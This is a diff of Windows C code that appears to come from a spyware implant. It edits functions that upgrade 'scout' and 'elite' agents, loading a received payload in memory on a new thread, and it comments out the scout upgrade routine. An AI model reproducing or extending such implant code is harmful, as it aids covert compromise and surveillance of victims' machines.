@@ -28,9 +28,11 @@ BOOL UpgradeRecover(PWCHAR pUpgradeName, PBYTE pFileBuffer, ULONG uFileLength)
 
 BOOL UpgradeScout(PWCHAR pUpgradeName, PBYTE pFileBuffer, ULONG uFileLength)
 {
+	
 	ULONG uOut;
 	LPWSTR pBatchName;
 	BOOL bRetVal = FALSE;
+	/*
 	HANDLE hFile = INVALID_HANDLE_VALUE;
 	LPWSTR pFileName = CreateTempFile();
 	LPWSTR pScoutName = GetStartupScoutName();
@@ -112,7 +114,7 @@ BOOL UpgradeScout(PWCHAR pUpgradeName, PBYTE pFileBuffer, ULONG uFileLength)
 	free(pScoutName);
 	free(pFileName);
 	free(pBatchName);
-	
+	*/
 	return bRetVal;
 }
 
@@ -125,7 +127,7 @@ ULONG UpgradeElite(PWCHAR pUpgradeName, PBYTE pFileBuffer, ULONG uFileLength)
 
 	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MemoryLoader, pFileBuffer, 0, NULL);
 	WaitForSingleObject(hThread, 60000);
-
+	
 	while (uRetries < 10)
 	{
 		if (ExistsEliteSharedMemory())
@@ -156,8 +158,14 @@ ULONG UpgradeElite(PWCHAR pUpgradeName, PBYTE pFileBuffer, ULONG uFileLength)
 	else
 		OutputDebugString(L"Memory Loader FAIL\n");
 #endif
-
+		
 	return bSuccess;
+
+
+
+
+
+	
 	/*																				
 	if(MemoryLoader(pFileBuffer))
 	{
